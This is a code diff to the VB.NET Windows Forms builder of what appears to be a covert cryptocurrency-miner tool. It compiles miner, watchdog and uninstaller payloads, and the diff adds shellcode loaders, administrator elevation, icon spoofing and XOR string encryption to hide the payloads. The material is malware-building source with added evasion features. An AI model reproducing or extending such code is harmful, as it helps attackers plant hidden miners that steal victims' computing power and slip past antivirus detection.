@@ -38,6 +38,8 @@ Public Class Form1
     Public SALT As String = Randomi(32)
     Public IV As String = Randomi(16)
 
+    Public Key = RandomString(32)
+
     Public InjectionTarget As String()
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
         Try
@@ -128,7 +130,19 @@ Public Class Form1
                         If FA.toggleObfuscation.Checked Then
                             MessageBox.Show("The Watchdog has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".exe" & "). Press OK after you're done with obfuscating and replacing the Watchdog.")
                         End If
-                        watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
+                        If FA.toggleShellcode.Checked Then
+                            Codedom.LoaderCompiler(watchdogpath & "-loader.exe", watchdogpath & ".exe", """/sihost64""", Nothing, False, FA.toggleAdministrator.Checked)
+                            If Codedom.LoaderOK Then
+                                watchdogdata = File.ReadAllBytes(watchdogpath & "-loader.exe")
+                                File.Delete(watchdogpath & "-loader.exe")
+                                txtLog.Text = txtLog.Text + ("Compiled Watchdog loader!" + vbNewLine)
+                            Else
+                                BuildError("Error compiling Watchdog loader!")
+                                Return
+                            End If
+                        Else
+                            watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
+                        End If
                         File.Delete(watchdogpath & ".exe")
                     Else
                         BuildError("Error compiling Watchdog payload!")
@@ -139,33 +153,44 @@ Public Class Form1
 
             Dim MinerSource = minerbuilder.ToString
 
-            Dim minerpath As String = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-miner.dll"
-            Codedom.MinerCompiler(minerpath, MinerSource, Resources_Parent)
+            Dim minerpath As String = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & If(FA.toggleShellcode.Checked, "-miner.exe", ".exe")
+            Codedom.MinerCompiler(minerpath, MinerSource, Resources_Parent, If(chkIcon.Checked AndAlso txtIconPath.Text IsNot "", txtIconPath.Text, Nothing), FA.toggleAdministrator.Checked)
             If Codedom.MinerOK Then
                 txtLog.Text = txtLog.Text + ("Compiled Miner payload!" + vbNewLine)
                 If FA.toggleObfuscation.Checked Then
                     MessageBox.Show("The Miner payload has been compiled and can be found in the same folder as the chosen miner path (" & minerpath & "). Press OK after you're done with obfuscating and replacing the Miner payload.")
                 End If
-                Codedom.LoaderCompiler(OutputPayload, File.ReadAllBytes(minerpath), If(chkIcon.Checked AndAlso txtIconPath.Text IsNot "", txtIconPath.Text, Nothing), FA.toggleAdministrator.Checked)
-                Codedom.UninstallerCompiler(Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-uninstaller.exe")
+                Dim uninstallerpath As String = Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-uninstaller"
+                Codedom.UninstallerCompiler(uninstallerpath & If(FA.toggleShellcode.Checked, "-payload.exe", ".exe"))
 
-                If Codedom.LoaderOK Then
-                    Try
-                        File.Delete(minerpath)
-                        File.Delete(Path.GetTempPath + "\" + Resources_Parent + ".Resources")
-                    Catch ex As Exception
-                    End Try
-                    txtLog.Text = txtLog.Text + ("Compiled Miner loader!" + vbNewLine)
-                    If FA.toggleObfuscation.Checked Then
-                        MessageBox.Show("The Miner loader has been compiled and can be found in the same folder as the chosen miner path (" & OutputPayload & "). Press OK after you're done with obfuscating and replacing the Miner loader.")
+                If FA.toggleShellcode.Checked Then
+                    Codedom.LoaderCompiler(uninstallerpath & ".exe", uninstallerpath & "-payload.exe", """""", Nothing, False, True)
+                    If Codedom.LoaderOK Then
+                        Try
+                            File.Delete(uninstallerpath & "-payload.exe")
+                        Catch ex As Exception
+                        End Try
+                        txtLog.Text = txtLog.Text + ("Compiled Uninstaller loader!" + vbNewLine)
+                    Else
+                        BuildError("Error compiling Uninstaller loader!")
                     End If
-                    txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
-                    If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
-                    btnBuild.Enabled = True
-                Else
-                    BuildError("Error compiling Miner loader!")
-                    Return
+                    Codedom.LoaderCompiler(OutputPayload, minerpath, "buffer", If(chkIcon.Checked AndAlso txtIconPath.Text IsNot "", txtIconPath.Text, Nothing), chkAssembly.Checked, FA.toggleAdministrator.Checked, True)
+                    If Codedom.LoaderOK Then
+                        Try
+                            File.Delete(minerpath)
+                            File.Delete(Path.GetTempPath + "\" + Resources_Parent + ".Resources")
+                        Catch ex As Exception
+                        End Try
+                        txtLog.Text = txtLog.Text + ("Compiled Miner loader!" + vbNewLine)
+                    Else
+                        BuildError("Error compiling Miner loader!")
+                        Return
+                    End If
                 End If
+
+                txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
+                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
+                btnBuild.Enabled = True
             Else
                 BuildError("Error compiling Miner payload!")
                 Return
@@ -251,48 +276,121 @@ Public Class Form1
         Return ""
     End Function
 
-    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
-        If chkInstall.Checked Then
-            chkInstall.Text = "Enabled"
-            txtInstallPathMain.Enabled = True
-            txtInstallFileName.Enabled = True
-        Else
-            chkInstall.Text = "Disabled"
-            txtInstallPathMain.Enabled = False
-            txtInstallFileName.Enabled = False
+    Public Sub RunExternalProgram(ByVal filename As String, ByVal arguments As String, ByVal workingDirectory As String, ByVal logpath As String)
+        Using process As Process = New Process()
+            process.StartInfo.FileName = filename
+            process.StartInfo.Arguments = arguments
+            process.StartInfo.WorkingDirectory = workingDirectory
+            process.StartInfo.CreateNoWindow = True
+            process.StartInfo.UseShellExecute = False
+            process.StartInfo.RedirectStandardError = True
+            process.Start()
+
+            Using writer = File.AppendText(logpath)
+                writer.Write(process.StandardError.ReadToEnd())
+            End Using
+
+            process.WaitForExit()
+        End Using
+    End Sub
+
+    Public Function BuildErrorTest(ByVal condition As Boolean, ByVal message As String) As Boolean
+        If condition Then
+            MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            Return True
         End If
+
+        Return False
+    End Function
+
+    Public Sub CipherReplace(ByVal source As StringBuilder, ByVal id As String, ByVal value As String)
+        source.Replace(id & "LENGTH", value.Length.ToString())
+        source.Replace(id, ToLiteral(Cipher(value, Key)))
+    End Sub
+
+    Public Function RandomString(ByVal length As Integer) As String
+        Const chars = "abcdefghijklmnpqrstuvwxyz0123456789!$&()*+,-./:<=>@[]^_"
+        Const clength = 55
+        Dim buffer = New Char(length - 1) {}
+        Dim i = 0
+
+        While i < length
+            buffer(i) = chars(rand.Next(0, clength))
+            Threading.Interlocked.Increment(i)
+        End While
+
+        Return New String(buffer)
+    End Function
+
+    Public Function Cipher(ByVal data As String, ByVal key As String) As String
+        Dim dataLen As Integer = data.Length
+        Dim keyLen As Integer = key.Length
+        Dim output As Char() = New Char(dataLen - 1) {}
+
+        For i As Integer = 0 To dataLen - 1
+            output(i) = ChrW(AscW(data(i)) Xor AscW(key(i Mod keyLen)))
+        Next
+
+        Return New String(output)
+    End Function
+
+    Public Function ToLiteral(ByVal input As String) As String
+        Dim literal = New StringBuilder(input.Length + 2)
+
+        For Each c In input
+            Select Case c
+                Case """"c
+                    literal.Append("\""")
+                Case "\"c
+                    literal.Append("\\")
+                Case ChrW(0)
+                    literal.Append("\u0000")
+                Case ChrW(7)
+                    literal.Append("\a")
+                Case ChrW(8)
+                    literal.Append("\b")
+                Case ChrW(12)
+                    literal.Append("\f")
+                Case ChrW(10)
+                    literal.Append("\n")
+                Case ChrW(13)
+                    literal.Append("\r")
+                Case ChrW(9)
+                    literal.Append("\t")
+                Case ChrW(11)
+                    literal.Append("\v")
+                Case Else
+                    literal.Append(c)
+            End Select
+        Next
+
+        Return literal.ToString()
+    End Function
+
+    Public Function CheckNonASCII(ByVal text As String) As Char()
+        Return text.Where(Function(c) AscW(c) > 127).ToArray()
+    End Function
+
+    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
+        chkInstall.Text = If(chkInstall.Checked, "Enabled", "Disabled")
+        txtInstallPathMain.Enabled = chkInstall.Checked
+        txtInstallFileName.Enabled = chkInstall.Checked
     End Sub
 
     Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
-        If chkAssembly.Checked Then
-            chkAssembly.Text = "Enabled"
-            txtTitle.Enabled = True
-            txtDescription.Enabled = True
-            txtProduct.Enabled = True
-            txtCompany.Enabled = True
-            txtCopyright.Enabled = True
-            txtTrademark.Enabled = True
-            num_Assembly1.Enabled = True
-            num_Assembly2.Enabled = True
-            num_Assembly3.Enabled = True
-            num_Assembly4.Enabled = True
-            btn_assemblyRandom.Enabled = True
-            btn_assemblyClone.Enabled = True
-        Else
-            chkAssembly.Text = "Disabled"
-            txtTitle.Enabled = False
-            txtDescription.Enabled = False
-            txtProduct.Enabled = False
-            txtCompany.Enabled = False
-            txtCopyright.Enabled = False
-            txtTrademark.Enabled = False
-            num_Assembly1.Enabled = False
-            num_Assembly2.Enabled = False
-            num_Assembly3.Enabled = False
-            num_Assembly4.Enabled = False
-            btn_assemblyRandom.Enabled = False
-            btn_assemblyClone.Enabled = False
-        End If
+        chkAssembly.Text = If(chkAssembly.Checked, "Enabled", "Disabled")
+        txtTitle.Enabled = chkAssembly.Checked
+        txtDescription.Enabled = chkAssembly.Checked
+        txtProduct.Enabled = chkAssembly.Checked
+        txtCompany.Enabled = chkAssembly.Checked
+        txtCopyright.Enabled = chkAssembly.Checked
+        txtTrademark.Enabled = chkAssembly.Checked
+        num_Assembly1.Enabled = chkAssembly.Checked
+        num_Assembly2.Enabled = chkAssembly.Checked
+        num_Assembly3.Enabled = chkAssembly.Checked
+        num_Assembly4.Enabled = chkAssembly.Checked
+        btn_assemblyRandom.Enabled = chkAssembly.Checked
+        btn_assemblyClone.Enabled = chkAssembly.Checked
     End Sub
 
     Private Sub btn_assemblyRandom_Click(sender As Object, e As EventArgs) Handles btn_assemblyRandom.Click
@@ -386,13 +484,8 @@ Public Class Form1
     End Sub
 
     Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
-        If chkIcon.Checked Then
-            chkIcon.Text = "Enabled"
-            btnBrowseIcon.Enabled = True
-        Else
-            chkIcon.Text = "Disabled"
-            btnBrowseIcon.Enabled = False
-        End If
+        chkIcon.Text = If(chkIcon.Checked, "Enabled", "Disabled")
+        btnBrowseIcon.Enabled = chkIcon.Checked
     End Sub
 
     Private Sub btnBrowseIcon_Click(sender As Object, e As EventArgs) Handles btnBrowseIcon.Click
@@ -412,7 +505,7 @@ Public Class Form1
 
     Private Sub MephTabControl2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles MephTabcontrol2.SelectedIndexChanged
         On Error Resume Next
-        If Me.MephTabcontrol2.SelectedIndex = 0 Then
+        If MephTabcontrol2.SelectedIndex = 0 Then
         End If
     End Sub
 
